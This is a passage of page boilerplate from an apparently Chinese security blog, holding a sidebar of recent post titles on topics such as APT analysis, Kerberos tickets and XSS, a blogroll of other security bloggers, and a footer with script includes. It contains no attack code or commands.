15px;">编程 进阶</a></div></div><div class="widget"><div class="widget-title"><i class="fa fa-file-o"> Letzte</i></div><ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2019/05/03/Python3 爬虫知识梳理(基础篇)/">Python3 爬虫知识梳理(基础篇)</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/29/New Page ,New Future/">New Page,New Future</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/20/JAVA 泛型、动态代理技术要点梳理/">JAVA 泛型、动态代理技术要点梳理</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/04/TCTF 2019 线上赛 web 题 writeup/">TCTF 2019 线上赛 web 题 writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/23/2018 APT (Advanced Persistent Threat)攻击大事件/">2018 APT (Advanced Persistent Threat)攻击大事件</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/21/APT(高级持续威胁) 概念以及趋势概述/">APT(高级持续威胁) 概念以及趋势概述</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/19/威胁情报概念与APT事件分析模型概述/">威胁情报概念与APT事件分析模型概述</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/17/浅析 Kerberos 认证过程以及黄金票据和白银票据/">浅析 Kerberos 认证过程以及黄金票据和白银票据</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/13/C&C控制服务的设计和侦测方法综述(Drops from wooyun)/">C&C控制服务的设计和侦测方法综述(Drops from wooyun)</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/09/如何使用 DOM XSS 来绕过 CSP 的 nonces 机制(半机翻有删增)/">如何使用 DOM XSS 来绕过 CSP 的 nonces 机制(半机翻有删增)</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-external-link"> Blogroll</i></div><ul></ul><a href="https://math1as.com/" title="math1as" target="_blank">math1as</a><ul></ul><a href="https://www.zsxsoft.com/" title="zsx" target="_blank">zsx</a><ul></ul><a href="https://www.lorexxar.cn/" title="Lorexxar" target="_blank">Lorexxar</a><ul></ul><a href="https://chybeta.github.io/" title="Chybeta" target="_blank">Chybeta</a><ul></ul><a href="http://www.cnblogs.com/iamstudy/" title="L3m0n" target="_blank">L3m0n</a><ul></ul><a href="http://www.pupiles.com" title="pupiles" target="_blank">pupiles</a><ul></ul><a href="http://f1sh.site/" title="f1sh" target="_blank">f1sh</a><ul></ul><a href="https://www.leavesongs.com/" title="phithon" target="_blank">phithon</a><ul></ul><a href="http://sh3ll.me/" title="Chu" target="_blank">Chu</a><ul></ul><a href="https://www.virzz.com/" title="Virink" target="_blank">Virink</a><ul></ul><a href="http://blog.cal1.cn/" title="超威蓝猫" target="_blank">超威蓝猫</a><ul></ul><a href="https://ricterz.me" title="RicterZ" target="_blank">RicterZ</a><ul></ul><a href="https://cyto.top/" title="Cytosine" target="_blank">Cytosine</a><ul></ul><a href="http://foreversong.cn/" title="ADog" target="_blank">ADog</a><ul></ul><a href="http://www.ckj123.com/" title="cjk123" target="_blank">cjk123</a><ul></ul><a href="http://arch0n.sumblog.cn" title="August" target="_blank">August</a></div></div></div><div class="pure-u-1 pure-u-md-3-4"><div id="footer">Copyright © 2019 <a href="/." rel="nofollow">K0rz3n's Blog.</a> Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a><a rel="nofollow" target="_blank" href="https://github.com/tufu9441/maupassant-hexo"> Theme</a> by<a rel="nofollow" target="_blank" href="https://github.com/pagecho"> Cho.</a></div></div></div><a class="show" id="rocket" href="#top"></a><script type="text/javascript" src="/js/totop.js?v=0.0.0" async></script><script type="text/javascript" src="//lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js" async></script><script type="text/javascript" src="/js/fancybox.js?v=0.0.0" async></script><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css"><script type="text/javascript" src="/js/codeblock-resizer.js?v=0.0.0"></script><script type="text/javascript" src="/js/smartresize.js?v=0.0.0"></script></div></body></html>
